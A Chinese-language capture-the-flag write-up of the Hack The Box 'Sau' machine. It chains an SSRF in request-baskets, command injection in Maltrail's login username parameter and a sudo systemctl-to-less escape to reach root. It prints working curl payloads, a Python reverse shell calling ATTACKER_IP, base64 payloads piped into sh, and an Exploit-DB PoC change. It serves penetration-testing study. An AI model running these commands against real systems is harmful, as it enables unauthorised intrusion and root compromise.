# HTB Sau 完整攻击链总结：SSRF → Maltrail 参数命令注入 → systemctl/less 提权

nmap 发现外部开放端口：
  22/tcp     ssh
  55555/tcp request-baskets
  8338/tcp  外部 filtered / 不可直接访问

核心判断：
  8338 外部不可访问，不代表目标本机没有服务
  需要利用 request-baskets SSRF 让目标自己访问 127.0.0.1:8338

------------------------------------------------------------
1. request-baskets SSRF：CVE-2023-27163
------------------------------------------------------------

漏洞点：
  request-baskets 允许创建 basket，并配置 forward_url

利用原理：
  攻击者访问：
    http://TARGET:55555/basket_name/

  request-baskets 服务端会转发到：
    forward_url

  如果 forward_url 设置为：
    http://127.0.0.1:8338/

  那么访问 basket 时，实际是目标服务器自己访问自己的本地服务：
    127.0.0.1:8338

关键参数：
  forward_url      SSRF 转发目标
  proxy_response   是否把内部服务响应返回给攻击者
  expand_path      是否把 basket 后续路径拼接到 forward_url 后面
  insecure_tls     是否忽略 TLS 证书错误
  capacity         basket 保存请求数量

创建 basket：
  curl -i -s -X POST 'http://TARGET:55555/api/baskets/ssrf' -H 'Content-Type: application/json' -d '{"forward_url":"http://127.0.0.1:8338/","proxy_response":true,"insecure_tls":false,"expand_path":true,"capacity":250}'

访问内部服务：
  curl -i -s 'http://TARGET:55555/ssrf/'

成功特征：
  返回 Maltrail 页面
  页面中出现：
    Powered by maltrail (v0.53)

------------------------------------------------------------
2. 通过 SSRF 访问 Maltrail v0.53
------------------------------------------------------------

Maltrail 是目标本机内部服务：
  http://127.0.0.1:8338/

外部直接访问：
  http://TARGET:8338/
  通常 filtered / 不通

通过 SSRF 访问：
  http://TARGET:55555/ssrf/

确认 JS：
  curl -s 'http://TARGET:55555/ssrf/js/main.js' | grep -Ei 'login|username|password|ajax|post'

JS 中发现：
  $.ajax({
      type: "POST",
      url: "login",
      data: "username=" + ...
  })

说明真实登录接口：
  /login

------------------------------------------------------------
3. Maltrail v0.53 参数命令注入
------------------------------------------------------------

漏洞位置：
  POST /login

漏洞参数：
  username

漏洞类型：
  Unauthenticated OS Command Injection
  未认证操作系统命令注入

核心原因：
  后端处理 username 参数时，将用户输入拼接进系统命令或 subprocess 调用中
  username 没有正确过滤 shell 元字符
  导致可以通过 ;、反引号、管道符等执行额外系统命令

关键 payload 结构：
  username=;`command`

解释：
  ;        结束原本命令
  `...`    shell 命令替换，执行反引号中的命令
  command  攻击者想执行的系统命令

例子：
  username=;`id`

更稳定的利用方式：
  username=;`echo BASE64_PAYLOAD | base64 -d | sh`

为什么用 base64：
  反弹 shell payload 里有大量特殊字符：
    空格
    引号
    分号
    括号
    斜杠
    大于号
    小于号
    &

  这些字符在多层解析中容易被破坏：
    本地 shell
    curl
    HTTP 表单
    request-baskets
    Maltrail
    shell

  所以先把真实 payload base64 编码
  目标端再 base64 -d 解码后交给 sh 执行

------------------------------------------------------------
4. 为什么返回 401 / login failed 仍然可能成功
------------------------------------------------------------

Maltrail 登录逻辑大致是：

  收到 POST /login
    ↓
  读取 username/hash/nonce
    ↓
  处理 username 时触发命令注入
    ↓
  继续校验登录凭证
    ↓
  凭证错误
    ↓
  返回 401 / login failed

所以：
  401 不代表命令没执行
  login failed 不代表利用失败

真正判断依据：
  nc 监听端是否收到连接
  HTTP server 是否收到请求
  命令是否产生预期副作用

------------------------------------------------------------
5. 测试命令注入是否可用
------------------------------------------------------------

Kali 监听：
  nc -lvnp 8003

触发最小 Python 回连：
  curl -i -s -X POST 'http://TARGET:55555/ssrf/' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=;`python3 -c '\''import socket;s=socket.socket();s.connect(("ATTACKER_IP",8003));s.send(b"python3-ok\n");s.close()'\''`'

如果监听端收到：
  python3-ok

说明：
  命令注入成功
  python3 可用
  目标可以反连攻击机
  SSRF 到 /login 的路径正确

------------------------------------------------------------
6. 通过参数命令注入拿 shell
------------------------------------------------------------

Kali 监听：
  nc -lvnp 4444

生成 Python reverse shell payload：

  python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

base64 编码：
  echo 'python3 -c '\''import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'\''' | base64 -w0

触发命令注入：
  curl -i -s -X POST 'http://TARGET:55555/ssrf/' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=;`echo BASE64_PAYLOAD | base64 -d | sh`'

成功后获得：
  puma 用户 shell

------------------------------------------------------------
7. Exploit-DB PoC 注意点
------------------------------------------------------------

PoC 编号：
  EDB-ID: 51676

标题：
  Maltrail v0.53 - Unauthenticated Remote Code Execution

下载：
  curl -s https://www.exploit-db.com/download/51676 -o exploit.py

原版 PoC 逻辑：
  target_URL = sys.argv[3] + "/login"

适用情况：
  直接访问 Maltrail 根路径时使用
  例如：
    http://TARGET:8338
  最终打：
    http://TARGET:8338/login

在 Sau 这种 SSRF 场景中需要注意：
  如果 basket 根路径已经代理到内部 /login
  那么不要再自动拼接 /login

应该改成：
  target_URL = sys.argv[3]

运行方式：
  python3 exploit.py ATTACKER_IP 4444 http://TARGET:55555/ssrf/

不要写成：
  python3 exploit.py ATTACKER_IP 4444 http://TARGET:55555/ssrf/login

否则可能路径错误，导致 404、401 或 payload 不触发

------------------------------------------------------------
8. 拿到 puma shell 后枚举
------------------------------------------------------------

查看身份：
  id

查看当前用户：
  whoami

查看当前目录：
  pwd

查看 sudo 权限：
  sudo -l

发现：
  User puma may run the following commands on sau:
      (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

------------------------------------------------------------
9. sudo systemctl status 提权
------------------------------------------------------------

sudo 规则含义：
  puma 可以无密码以 root 权限运行：
    /usr/bin/systemctl status trail.service

关键点：
  systemctl status 会调用分页器 less
  less 支持执行外部命令
  less 中输入 !sh 可以启动 shell
  因为 systemctl 是 root 权限运行，所以 less 也是 root
  less 启动的 sh 也继承 root 权限

权限继承链：
  sudo(root)
    └── systemctl(root)
          └── less(root)
                └── sh(root)

执行：
  sudo /usr/bin/systemctl status trail.service

进入 less 后输入：
  !sh

确认 root：
  id

成功特征：
  uid=0(root)

------------------------------------------------------------
10. 完整最小攻击链
------------------------------------------------------------

nmap 发现 55555 request-baskets
→ 识别 request-baskets 版本存在 CVE-2023-27163 SSRF
→ 创建 basket，将 forward_url 指向 http://127.0.0.1:8338/
→ 通过 basket 访问内部 Maltrail v0.53
→ 查看 js/main.js，确认登录接口为 /login
→ 利用 /login 的 username 参数命令注入
→ payload 使用 username=;`echo BASE64 | base64 -d | sh`
→ 获得 puma shell
→ sudo -l
→ 发现 puma 可 NOPASSWD 运行 systemctl status trail.service
→ sudo /usr/bin/systemctl status trail.service
→ 进入 less
→ 输入 !sh
→ 获得 root shell

------------------------------------------------------------
11. OSCP 重点记忆
------------------------------------------------------------

SSRF 重点：
  127.0.0.1 指的是目标服务器自己，不是攻击机
  外部端口 filtered，不代表内部 localhost 没服务
  SSRF 常用于访问 localhost-only 服务

命令注入重点：
  参数位置：username
  接口位置：/login
  注入结构：username=;`command`
  稳定结构：username=;`echo BASE64 | base64 -d | sh`
  401/login failed 不等于失败
  是否成功要看监听端有没有反连

PoC 修改重点：
  原版 PoC 自动拼接 /login
  如果 SSRF basket 已经代理到 /login，需要去掉自动拼接
  target_URL = sys.argv[3]

提权重点：
  sudo -l 发现 NOPASSWD systemctl status
  systemctl status 可能进入 less
  less 中 !sh 可以逃逸到 root shell